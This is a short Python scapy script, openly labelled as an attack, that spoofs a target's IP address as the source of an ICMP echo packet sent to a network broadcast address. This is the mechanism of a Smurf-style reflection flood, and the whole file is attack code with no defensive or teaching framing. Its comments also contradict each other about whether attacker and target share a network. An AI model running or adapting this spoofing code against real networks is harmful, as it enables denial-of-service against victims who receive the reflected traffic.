# PERFORMING THIS ATTACK IN THE LOCAL NETWORK, HERE, THE ATTACHER AND THE TARGET IS IN THE SAME NETWORK
from scapy.all import *
import random

source_ip = "192.168.163.2" # this is the target's ip
source_mac = "00:50:56:e7:1a:49" # this is a random mac, since the two devices are in diffenent networks. if in same network, use the target's mac
broadcast_ip = "192.168.163.255" # this is the booadcast ip of the router/network
broadcast_mac = "ff:ff:ff:ff:ff:ff" # this will also be the broadcast mac.

def creating_packet(source_ip,source_mac,broadcast_ip,broadcast_mac):
    pkt = Ether()/IP()/ICMP()
    pkt["Ethernet"].dst = broadcast_mac
    pkt["Ethernet"].src = source_mac
    pkt["IP"].src = source_ip
    pkt["IP"].dst = broadcast_ip
    pkt["ICMP"].id = random.randint(1, 100)
    pkt["ICMP"].seq = random.randint(1, 100)
    sendp(pkt)
creating_packet(source_ip,source_mac,broadcast_ip,broadcast_mac)

